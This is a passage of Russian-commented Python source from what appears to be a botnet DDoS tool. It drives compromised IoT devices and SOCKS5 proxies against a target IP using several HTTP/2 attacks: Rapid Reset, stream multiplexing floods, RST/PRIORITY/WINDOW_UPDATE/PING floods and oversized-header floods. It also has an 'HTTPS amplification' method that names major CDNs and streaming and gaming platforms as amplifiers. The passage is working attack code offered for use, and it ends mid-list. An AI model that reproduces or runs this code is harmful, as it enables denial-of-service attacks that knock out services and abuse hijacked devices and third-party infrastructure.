                            total_bytes += sum(len(str(h)) for h in headers) + len(dynamic_post_data)
                        
                        wrapped_socket.close()
                        time.sleep(random.uniform(0.01, 0.05))
                        
                    except Exception as e:
                        continue
                
                print(f"✅ {device.ip}: {requests_sent} JSON запросов, {connections_made} соединений")
                return requests_sent, total_bytes
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, post_json_attack, "HTTP/2 POST JSON")
        
        # 📊 СТАТИСТИКА
        print(f"\n🚀 HTTP/2 POST JSON РЕЗУЛЬТАТЫ:")
        print(f"📊 Всего JSON запросов: {attack_stats['total_requests']:,}")
        print(f"🔗 Соединений: {attack_stats['connections_made']:,}")
        print(f"💾 Всего данных отправлено: {attack_stats['total_bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"📝 Размер JSON пакета: {attack_stats['json_payload_size']} байт")
        print(f"🎯 Видимость: ВЫСОКАЯ - JSON данные попадают в логи приложения!")
        
        return results

    def _load_json_data(self, json_file="post.json"):
        """Загружает данные из JSON файла"""
        try:
            with open(json_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            print(f"✅ Данные загружены из {json_file}")
            return data
        except FileNotFoundError:
            print(f"❌ Файл {json_file} не найден. Создаю пример...")
            return self._create_example_json(json_file)
        except json.JSONDecodeError as e:
            print(f"❌ Ошибка парсинга JSON в файле {json_file}: {e}")
            return None
        except Exception as e:
            print(f"❌ Ошибка загрузки файла {json_file}: {e}")
            return None

    def _create_example_json(self, json_file="post.json"):
        """Создает пример JSON файла если он не существует"""
        example_data = {
            "username": "admin",
            "password": "admin",
            "message": "TOSTOPPAYMEM - " + "X" * 500,
            "description": "README " * 10,
            "attack_signature": "HTTP2_MULTIPLEXING_FLOOD_VISIBLE_IN_LOGS",
            "timestamp": "2024-01-01T00:00:00Z",
            "metadata": {
                "type": "high_visibility_flood",
                "priority": "critical",
                "visible_text": "🚨🚨🚨 GOODBYE TOSTOPPAYMEN 🚨🚨🚨"
            }
        }
        
        try:
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(example_data, f, indent=2, ensure_ascii=False)
            print(f"✅ Создан пример файла {json_file}")
            return example_data
        except Exception as e:
            print(f"❌ Не удалось создать файл {json_file}: {e}")
            return example_data

    # Метод для кастомного текста
    def http2_post_custom_text_attack(self, target_ip, target_port=443, duration=60, 
                                     custom_text="YOUR_VISIBLE_TEXT_HERE"):
        """HTTP/2 POST атака с вашим видимым текстом"""
        
        json_data = {
            "payload": custom_text * 10,
            "attack_type": "http2_multiplexing_flood",
            "visible_in_logs": True,
            "timestamp": "2024-{}-{:02d}-{:02d}T{:02d}:{:02d}:{:02d}Z".format(
                random.randint(1,12), random.randint(1,28), random.randint(1,30),
                random.randint(0,23), random.randint(0,59), random.randint(0,59)
            ),
            "metadata": {
                "message": "TOSTOPPAYMEN"
            }
        }
        
        return self.http2_post_json_attack(
            target_ip=target_ip,
            target_port=target_port, 
            duration=duration,
            json_data=json_data
        )

    def http2_rapid_reset(self, target_ip, target_port=443, duration=60):
        """HTTP/2 Rapid Reset Attack - самый эффективный метод 2024-2025"""
        print(f"💥 ЗАПУСК HTTP/2 RAPID RESET НА {target_ip}:{target_port}")
        
        try:
            import h2.connection
            import h2.config
            import h2.events
        except ImportError:
            print("❌ Библиотека h2 не установлена. Установите: pip install h2")
            return None

        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_streams': 0,
            'total_rst_sent': 0,
            'connections_made': 0,
            'failed_attempts': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def rapid_reset_attack(device):
            streams_created = 0
            rst_sent = 0
            connections_made = 0
            failed_attempts = 0
            
            try:
                print(f"💥 {device.ip} начинает HTTP/2 Rapid Reset атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # 1. Устанавливаем HTTP/2 соединение
                        context = ssl.create_default_context()
                        context.set_alpn_protocols(['h2', 'http/1.1'])
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(15)
                        wrapped_socket = context.wrap_socket(sock, server_hostname=target_ip)
                        wrapped_socket.connect((target_ip, target_port))
                        
                        config = h2.config.H2Configuration(client_side=True)
                        conn = h2.connection.H2Connection(config=config)
                        conn.initiate_connection()
                        wrapped_socket.send(conn.data_to_send())
                        
                        connections_made += 1
                        attack_stats['connections_made'] += 1
                        
                        # 2. RAPID RESET ЦИКЛ - основная механика атаки
                        reset_cycles = random.randint(50, 200)  # Циклы на соединение
                        
                        for cycle in range(reset_cycles):
                            # Создаем множество потоков
                            streams_in_cycle = random.randint(100, 500)
                            stream_ids = []
                            
                            for i in range(streams_in_cycle):
                                stream_id = conn.get_next_available_stream_id()
                                stream_ids.append(stream_id)
                                
                                # Отправляем запрос
                                headers = [
                                    (':method', 'GET'),
                                    (':path', f'/api/v{random.randint(1,3)}/data/{random.randint(1000,9999)}'),
                                    (':authority', target_ip),
                                    (':scheme', 'https'),
                                    ('user-agent', random.choice(self.user_agents)),
                                    ('accept', '*/*')
                                ]
                                
                                conn.send_headers(stream_id, headers, end_stream=True)
                                wrapped_socket.send(conn.data_to_send())
                                
                                streams_created += 1
                                attack_stats['total_streams'] += 1
                            
                            # 3. МГНОВЕННЫЙ RST - ключевой момент атаки!
                            for stream_id in stream_ids:
                                # Отправляем RST ДО получения ответа!
                                conn.reset_stream(stream_id, error_code=8)  # CANCEL
                                wrapped_socket.send(conn.data_to_send())
                                
                                rst_sent += 1
                                attack_stats['total_rst_sent'] += 1
                            
                            # Короткая пауза между циклами
                            time.sleep(0.01)
                        
                        # Закрываем соединение
                        conn.close_connection()
                        wrapped_socket.send(conn.data_to_send())
                        wrapped_socket.close()
                        
                        print(f"🔄 {device.ip}: {connections_made} соединений, {streams_created} потоков, {rst_sent} RST")
                        
                    except Exception as e:
                        failed_attempts += 1
                        attack_stats['failed_attempts'] += 1
                        continue
                
                return streams_created, rst_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку
        results = self._run_attack(all_active_bots, attack_stats, rapid_reset_attack, "HTTP/2 Rapid Reset")
        
        # Статистика
        attack_duration = time.time() - attack_stats['start_time']
        print(f"\n💥 HTTP/2 RAPID RESET РЕЗУЛЬТАТЫ:")
        print(f"🎯 Потоков создано: {attack_stats['total_streams']:,}")
        print(f"🔄 RST отправлено: {attack_stats['total_rst_sent']:,}")
        print(f"🔗 Соединений: {attack_stats['connections_made']:,}")
        print(f"⚡ Эффективность: {attack_stats['total_rst_sent']/max(attack_duration, 1):.0f} RST/сек")
        print(f"❌ Ошибок: {attack_stats['failed_attempts']}")
        
        return results

    def http2_multiplexing_attack(self, target_ip, target_port=443, duration=60):
        """HTTP/2 MULTIPLEXING ATTACK - максимальное использование потоков"""
        print(f"🚀 Запуск HTTP/2 Multiplexing атаки на {target_ip}:{target_port}")
        
        try:
            import h2.connection
            import h2.config
        except ImportError:
            print("❌ Библиотека h2 не установлена")
            return None
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_streams': 0,
            'connections_made': 0,
            'multiplexing_efficiency': 0,
            'total_bytes': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def multiplexing_attack(device):
            streams_created = 0
            connections_made = 0
            total_bytes = 0
            
            try:
                print(f"🚀 {device.ip} начинает HTTP/2 Multiplexing атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Устанавливаем HTTP/2 соединение
                        context = ssl.create_default_context()
                        context.set_alpn_protocols(['h2'])
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(25)
                        wrapped_socket = context.wrap_socket(sock, server_hostname=target_ip)
                        wrapped_socket.connect((target_ip, target_port))
                        
                        config = h2.config.H2Configuration(client_side=True)
                        conn = h2.connection.H2Connection(config=config)
                        conn.initiate_connection()
                        wrapped_socket.send(conn.data_to_send())
                        
                        connections_made += 1
                        attack_stats['connections_made'] += 1
                        
                        # 🔥 МАКСИМАЛЬНОЕ МУЛЬТИПЛЕКСИРОВАНИЕ
                        max_streams_in_connection = random.randint(100, 1000)
                        
                        for stream_id in range(1, max_streams_in_connection * 2, 2):
                            if stream_id > 10000:  # Защита от переполнения
                                break
                                
                            # Быстрые GET запросы
                            headers = [
                                (':method', 'GET'),
                                (':path', f'/{random.randint(1000, 9999)}?cache={random.random()}'),
                                (':authority', target_ip),
                                (':scheme', 'https'),
                                ('user-agent', random.choice(self.user_agents)),
                                ('accept', '*/*')
                            ]
                            
                            conn.send_headers(stream_id, headers, end_stream=True)
                            wrapped_socket.send(conn.data_to_send())
                            
                            streams_created += 1
                            attack_stats['total_streams'] += 1
                            total_bytes += sum(len(str(h)) for h in headers)
                        
                        # Быстрое закрытие соединения
                        wrapped_socket.close()
                        
                        # Очень короткая пауза
                        time.sleep(random.uniform(0.01, 0.05))
                        
                    except Exception as e:
                        continue
                
                efficiency = (streams_created / max(connections_made, 1))
                attack_stats['multiplexing_efficiency'] = efficiency
                
                print(f"✅ {device.ip}: {streams_created} потоков, {connections_made} соединений, эффективность: {efficiency:.1f}")
                return streams_created, total_bytes
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, multiplexing_attack, "HTTP/2 Multiplexing")
        
        # 📊 СТАТИСТИКА MULTIPLEXING
        print(f"\n🚀 HTTP/2 MULTIPLEXING РЕЗУЛЬТАТЫ:")
        print(f"📊 Всего потоков: {attack_stats['total_streams']:,}")
        print(f"🔗 Соединений: {attack_stats['connections_made']:,}")
        print(f"🎯 Эффективность: {attack_stats['multiplexing_efficiency']:.1f} потоков/соединение")
        print(f"💾 Данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} MB")
        
        return results

    def http2_killer(self, target_ip, target_port=443, duration=60):
        """УЛУЧШЕННЫЙ HTTP/2 KILLER - максимальное разрушение"""
        print(f"💀 ЗАПУСК УЛУЧШЕННОГО HTTP/2 KILLER НА {target_ip}:{target_port}")
        
        try:
            import h2.connection
            import h2.config
            import h2.events
        except ImportError:
            print("❌ Библиотека h2 не установлена. Установите: pip install h2")
            return None
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_streams': 0,
            'total_rst_frames': 0,
            'total_priority_frames': 0,
            'total_window_updates': 0,
            'total_bytes': 0,
            'failed_connections': 0,
            'server_errors': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def advanced_http2_killer(device):
            streams_created = 0
            rst_frames_sent = 0
            priority_frames_sent = 0
            window_updates_sent = 0
            bytes_sent = 0
            failed_connections = 0
            server_errors = 0
            
            try:
                print(f"💀 {device.ip} начинает УЛУЧШЕННЫЙ HTTP/2 KILLER...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # 1. Устанавливаем TLS соединение с HTTP/2
                        context = ssl.create_default_context()
                        context.set_alpn_protocols(['h2', 'http/1.1'])
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(20)
                        wrapped_socket = context.wrap_socket(sock, server_hostname=target_ip)
                        wrapped_socket.connect((target_ip, target_port))
                        
                        # 2. Инициализируем HTTP/2 соединение
                        config = h2.config.H2Configuration(client_side=True)
                        conn = h2.connection.H2Connection(config=config)
                        conn.initiate_connection()
                        wrapped_socket.send(conn.data_to_send())
                        
                        # 🔥 ТАКТИКА 1: MASS STREAM CREATION
                        streams_per_connection = random.randint(100, 500)  # Увеличили в 5 раз
                        stream_ids = []
                        
                        for i in range(streams_per_connection):
                            stream_id = conn.get_next_available_stream_id()
                            stream_ids.append(stream_id)
                            
                            # Создаем различные типы запросов
                            request_types = [
                                # Большие заголовки
                                [
                                    (':method', 'GET'),
                                    (':path', f'/api/v{random.randint(1,3)}/data/{random.randint(1000,9999)}'),
                                    (':authority', target_ip),
                                    (':scheme', 'https'),
                                    ('user-agent', random.choice(self.user_agents)),
                                    ('accept', '*/*'),
                                    ('cache-control', 'no-cache'),
                                    (f'x-custom-{i}', 'A' * random.randint(100, 500))
                                ],
                                # POST с телом
                                [
                                    (':method', 'POST'),
                                    (':path', f'/submit/{random.randint(1000,9999)}'),
                                    (':authority', target_ip),
                                    (':scheme', 'https'),
                                    ('content-type', 'application/json'),
                                    ('content-length', str(random.randint(500, 2000))),
                                    ('user-agent', random.choice(self.user_agents))
                                ]
                            ]
                            
                            headers = random.choice(request_types)
                            conn.send_headers(stream_id, headers, end_stream=False)
                            wrapped_socket.send(conn.data_to_send())
                            
                            # Для POST отправляем данные
                            if headers[0][1] == 'POST':
                                data = os.urandom(random.randint(500, 2000))
                                conn.send_data(stream_id, data, end_stream=True)
                                wrapped_socket.send(conn.data_to_send())
                            
                            streams_created += 1
                            attack_stats['total_streams'] += 1
                            
                            # 🔥 ТАКТИКА 2: RST FLOOD (каждый 5-й поток)
                            if random.random() > 0.8 and len(stream_ids) > 10:
                                rst_stream_id = random.choice(stream_ids[:-5])
                                conn.reset_stream(rst_stream_id, error_code=random.randint(1, 10))
                                wrapped_socket.send(conn.data_to_send())
                                rst_frames_sent += 1
                                attack_stats['total_rst_frames'] += 1
                            
                            # 🔥 ТАКТИКА 3: PRIORITY FLOOD (каждый 10-й поток)
                            if random.random() > 0.9:
                                for _ in range(random.randint(3, 15)):
                                    target_stream = random.choice(stream_ids) if stream_ids else 1
                                    conn.prioritize(
                                        stream_id=target_stream,
                                        weight=random.randint(1, 256),
                                        depends_on=random.choice([0] + stream_ids),
                                        exclusive=random.choice([True, False])
                                    )
                                    priority_frames_sent += 1
                                    attack_stats['total_priority_frames'] += 1
                                wrapped_socket.send(conn.data_to_send())
                        
                        # 🔥 ТАКТИКА 4: WINDOW UPDATE FLOOD
                        for stream_id in random.sample(stream_ids, min(20, len(stream_ids))):
                            conn.window_update(stream_id, random.randint(5000, 50000))
                            window_updates_sent += 1
                            attack_stats['total_window_updates'] += 1
                        wrapped_socket.send(conn.data_to_send())
                        
                        # 🔥 ТАКТИКА 5: PING FLOOD
                        for _ in range(random.randint(5, 20)):
                            conn.ping(os.urandom(8))
                            wrapped_socket.send(conn.data_to_send())
                        
                        # Чтение ответов для обнаружения ошибок
                        try:
                            wrapped_socket.settimeout(2)
                            while True:
                                data = wrapped_socket.recv(65536)
                                if not data:
                                    break
                                events = conn.receive_data(data)
                                
                                for event in events:
                                    if isinstance(event, h2.events.StreamReset):
                                        server_errors += 1
                                        attack_stats['server_errors'] += 1
                                        print(f"💥 {device.ip}: Сервер сбросил поток!")
                                
                                wrapped_socket.send(conn.data_to_send())
                        except socket.timeout:
                            pass
                        
                        # Закрываем соединение
                        conn.close_connection(error_code=random.randint(0, 10))
                        wrapped_socket.send(conn.data_to_send())
                        
                        wrapped_socket.close()
                        
                        # Статистика байтов
                        bytes_estimate = streams_per_connection * 800  # Увеличили оценку
                        bytes_sent += bytes_estimate
                        attack_stats['total_bytes'] += bytes_estimate
                        
                        # Задержка между соединениями
                        time.sleep(random.uniform(0.05, 0.2))
                        
                    except Exception as e:
                        failed_connections += 1
                        attack_stats['failed_connections'] += 1
                        continue
                
                print(f"✅ {device.ip} завершил: {streams_created} потоков, {rst_frames_sent} RST, {priority_frames_sent} PRIORITY")
                return streams_created, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(
            all_active_bots, 
            attack_stats, 
            advanced_http2_killer, 
            "HTTP/2 Killer Advanced",
            max_workers=min(len(all_active_bots) * 3, self.max_threads)
        )
        
        # 📊 ДЕТАЛЬНАЯ СТАТИСТИКА
        total_duration = time.time() - attack_stats['start_time']
        
        print(f"\n💀 HTTP/2 KILLER ADVANCED РЕЗУЛЬТАТЫ:")
        print(f"📊 Всего потоков: {attack_stats['total_streams']:,}")
        print(f"🔁 RST фреймов: {attack_stats['total_rst_frames']:,}")
        print(f"🎯 PRIORITY фреймов: {attack_stats['total_priority_frames']:,}")
        print(f"📈 WINDOW UPDATE: {attack_stats['total_window_updates']:,}")
        print(f"💾 Данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} MB")
        print(f"💥 Ошибок сервера: {attack_stats['server_errors']}")
        print(f"❌ Ошибок соединений: {attack_stats['failed_connections']}")
        print(f"⏱️ Время: {total_duration:.2f} сек")
        
        return results
        

    def http2_flood(self, target_ip, target_port=443, duration=60):
        """
        Настоящая HTTP/2 атака с использованием протокола HTTP/2
        """
        try:
            import h2.connection
            import h2.config
            import h2.events
        except ImportError:
            print("❌ Библиотека h2 не установлена. Установите: pip install h2")
            return None
        
        # АВТОМАТИЧЕСКИ ИСПОЛЬЗУЕМ ВСЕ ДОСТУПНЫЕ БОТЫ - ДОБАВЛЕНО
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        # ОБЪЕДИНЯЕМ ВСЕ АКТИВНЫЕ БОТЫ - ДОБАВЛЕНО
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'total_streams': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def http2_attack(device):  # ИСПРАВЛЕНО ИМЯ ФУНКЦИИ
            streams_sent = 0
            bytes_sent = 0
            failed_requests = 0
            
            try:
                print(f"🚀 {device.ip} начинает настоящую HTTP/2 атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # 1. Устанавливаем TLS соединение с ALPN для HTTP/2
                        context = ssl.create_default_context()
                        context.set_alpn_protocols(['h2'])  # Только HTTP/2
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(15)
                        wrapped_socket = context.wrap_socket(sock, server_hostname=target_ip)
                        wrapped_socket.connect((target_ip, target_port))
                        
                        # 2. Создаем HTTP/2 соединение
                        config = h2.config.H2Configuration(client_side=True)
                        conn = h2.connection.H2Connection(config=config)
                        
                        # 3. Инициируем HTTP/2 соединение
                        conn.initiate_connection()
                        wrapped_socket.send(conn.data_to_send())
                        
                        # 4. Отправляем несколько потоков (streams) в одном соединении
                        num_streams = random.randint(5, 20)  # Мультиплексирование
                        
                        for stream_id in range(1, num_streams * 2, 2):  # HTTP/2 использует нечетные ID для клиента
                            # Создаем HTTP/2 headers
                            headers = [
                                (':method', 'GET'),
                                (':path', f'/{random.randint(1000, 9999)}?r={random.random()}'),
                                (':authority', target_ip),
                                (':scheme', 'https'),
                                ('user-agent', random.choice(self.user_agents)),
                                ('accept', '*/*'),
                                ('cache-control', 'no-cache')
                            ]
                            
                            # Отправляем headers frame
                            conn.send_headers(stream_id, headers, end_stream=True)
                            wrapped_socket.send(conn.data_to_send())
                            
                            streams_sent += 1
                            attack_stats['total_streams'] += 1
                            bytes_sent += sum(len(str(h)) for h in headers)
                            
                            # Небольшая задержка между потоками
                            time.sleep(random.uniform(0.01, 0.05))
                        
                        # 5. Читаем ответы (необязательно, но для реалистичности)
                        try:
                            wrapped_socket.settimeout(2)
                            response_data = b''
                            while True:
                                data = wrapped_socket.recv(65536)
                                if not data:
                                    break
                                response_data += data
                                
                                # Обрабатываем HTTP/2 фреймы
                                events = conn.receive_data(data)
                                for event in events:
                                    if isinstance(event, h2.events.ResponseReceived):
                                        # Ответ получен - можно логировать
                                        pass
                        except socket.timeout:
                            # Таймаут при чтении - нормально для флуда
                            pass
                        
                        wrapped_socket.close()
                        
                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes'] += bytes_sent
                        
                        # Задержка между соединениями
                        time.sleep(random.uniform(0.1, 0.5))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip} отправил {streams_sent} HTTP/2 streams ({mb_sent:.2f} МБ), ошибок: {failed_requests}")
                return streams_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # ИСПРАВЛЕНО: используем all_active_bots вместо несуществующей переменной
        return self._run_attack(all_active_bots, attack_stats, http2_attack, "HTTP/2")

    def http2_advanced_flood(self, target_ip, target_port=443, duration=60):
        """
        Продвинутая HTTP/2 атака с различными векторами
        """
        try:
            import h2.connection
            import h2.config
            import h2.events
        except ImportError:
            print("❌ Библиотека h2 не установлена")
            return None
        
        # ДОБАВЛЕНО: автоматическое использование всех ботов
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        # ДОБАВЛЕНО: объединение всех ботов
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'total_streams': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def advanced_http2_attack(device):  # ИСПРАВЛЕНО ИМЯ ФУНКЦИИ
            try:
                print(f"🎯 {device.ip} начинает продвинутую HTTP/2 атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Установка соединения
                        context = ssl.create_default_context()
                        context.set_alpn_protocols(['h2'])
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(20)
                        wrapped_socket = context.wrap_socket(sock, server_hostname=target_ip)
                        wrapped_socket.connect((target_ip, target_port))
                        
                        config = h2.config.H2Configuration(client_side=True)
                        conn = h2.connection.H2Connection(config=config)
                        conn.initiate_connection()
                        wrapped_socket.send(conn.data_to_send())
                        
                        # Вектор 1: Мультиплексирование многих потоков
                        for stream_id in range(1, 101, 2):  # 50 потоков
                            headers = [
                                (':method', 'GET'),
                                (':path', f'/api/v1/data/{random.randint(1000, 9999)}'),
                                (':authority', target_ip),
                                (':scheme', 'https'),
                                ('user-agent', random.choice(self.user_agents)),
                                ('accept', 'application/json,text/html'),
                                ('accept-encoding', 'gzip, deflate, br')
                            ]
                            conn.send_headers(stream_id, headers, end_stream=True)
                            wrapped_socket.send(conn.data_to_send())
                            attack_stats['total_streams'] += 1
                        
                        # Вектор 2: Большие заголовки (HPACK атака)
                        large_headers = [
                            (':method', 'GET'),
                            (':path', '/'),
                            (':authority', target_ip),
                            (':scheme', 'https'),
                            ('user-agent', 'Mozilla/5.0 ' + 'x' * 500),  # Большой заголовок
                            ('x-custom', 'A' * 1000)  # Очень большой кастомный заголовок
                        ]
                        conn.send_headers(103, large_headers, end_stream=True)
                        wrapped_socket.send(conn.data_to_send())
                        attack_stats['total_streams'] += 1
                        
                        # Вектор 3: PRIORITY frames (атака на приоритизацию)
                        for i in range(5):
                            conn.prioritize(stream_id=i*2+1, weight=random.randint(1, 256), 
                                          depends_on=0, exclusive=False)
                            wrapped_socket.send(conn.data_to_send())
                        
                        # Чтение ответов
                        self._receive_http2_responses(wrapped_socket, conn)
                        
                        wrapped_socket.close()
                        attack_stats['total_requests'] += 1
                        
                        time.sleep(random.uniform(0.2, 1.0))
                        
                    except Exception as e:
                        attack_stats['failed_requests'] += 1
                        continue
                
                print(f"✅ {device.ip} завершил продвинутую HTTP/2 атаку")
                return attack_stats['total_streams'], attack_stats['total_bytes']
                
            except Exception as e:
                print(f"❌ Ошибка: {e}")
                return 0, 0
        
        # ДОБАВЛЕНО: метод для обработки ответов
        def _receive_http2_responses(socket, connection):
            """Чтение и обработка HTTP/2 ответов"""
            try:
                socket.settimeout(3)
                total_data = b''
                
                while True:
                    data = socket.recv(65536)
                    if not data:
                        break
                    total_data += data
                    
                    events = connection.receive_data(data)
                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            # Логируем полученные заголовки
                            pass
                        elif isinstance(event, h2.events.DataReceived):
                            # Обрабатываем данные
                            connection.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                            
            except socket.timeout:
                pass
            except Exception:
                pass
        
        # ИСПРАВЛЕНО: используем all_active_bots
        return self._run_attack(all_active_bots, attack_stats, advanced_http2_attack, "HTTP/2 Advanced")

    def https_amplification_attack(self, target_ip, target_port=443, duration=60):
        """HTTPS Amplification атака - использование HTTPS запросов для amplification"""
        print(f"🔒 Запуск HTTPS Amplification атаки на {target_ip}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def _create_https_amplification_request(target_host, target_port=443):
            """Создает HTTPS запрос для amplification атаки"""
            try:
                # Создаем SSL контекст
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Устанавливаем HTTPS соединение
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
                ssl_sock.connect((target_host, target_port))
                
                # Отправляем запросы, которые вызывают большие ответы
                requests = [
                    # Запрос корневого пути с множеством заголовков
                    "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n".format(
                        target_host, random.choice(self.user_agents)),
                    
                    # Запрос API с ожиданием большого JSON ответа
                    "GET /api/v1/data HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: application/json\r\nConnection: keep-alive\r\n\r\n".format(
                        target_host, random.choice(self.user_agents)),
                    
                    # Запрос с кастомными заголовками для увеличения размера
                    "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nX-Custom-Header-1: {}\r\nX-Custom-Header-2: {}\r\nX-Custom-Header-3: {}\r\n\r\n".format(
                        target_host, random.choice(self.user_agents), 
                        'A' * 100, 'B' * 150, 'C' * 200),
                ]
                
                # Выбираем случайный запрос
                request = random.choice(requests)
                ssl_sock.send(request.encode())
                
                # Читаем ответ (может быть большим)
                response = b""
                try:
                    while True:
                        chunk = ssl_sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                        if len(response) > 100000:  # Ограничиваем размер ответа
                            break
                except socket.timeout:
                    pass
                
                ssl_sock.close()
                
                # Возвращаем размер запроса и ответа для оценки amplification
                return len(request), len(response)
                
            except Exception as e:
                return 0, 0

        # Определяем default_amplifiers здесь, чтобы он был доступен во всех функциях
        default_amplifiers = [
            # 🌐 КРУПНЕЙШИЕ CDN И СЕТИ ДОСТАВКИ КОНТЕНТА
            ('cloudflare.com', 443),
            ('akamaized.net', 443),
            ('edgesuite.net', 443),
            ('amazonaws.com', 443),
            ('azureedge.net', 443),
            ('googleapis.com', 443),
            ('fastly.net', 443),
            
            # 📊 МЕДИА И СТРИМИНГОВЫЕ ГИГАНТЫ
            ('netflix.com', 443),
            ('youtube.com', 443),
            ('twitch.tv', 443),
            ('hulu.com', 443),
            ('disneyplus.com', 443),
            ('vimeo.com', 443),
            ('dailymotion.com', 443),
            
            # 🎮 ИГРОВЫЕ ПЛАТФОРМЫ И СЕРВИСЫ
            ('steamcontent.com', 443),
            ('steampowered.com', 443),
            ('origin.com', 443),
            ('battle.net', 443),
            ('epicgames.com', 443),
            ('xboxlive.com', 443),
            ('playstation.com', 443),
            
            # 💾 ФАЙЛОВЫЕ ХОСТИНГИ И ОБЛАЧНЫЕ ХРАНИЛИЩА
            ('dropbox.com', 443),
            ('mega.nz', 443),
            ('mediafire.com', 443),
            ('box.com', 443),
            ('onedrive.live.com', 443),
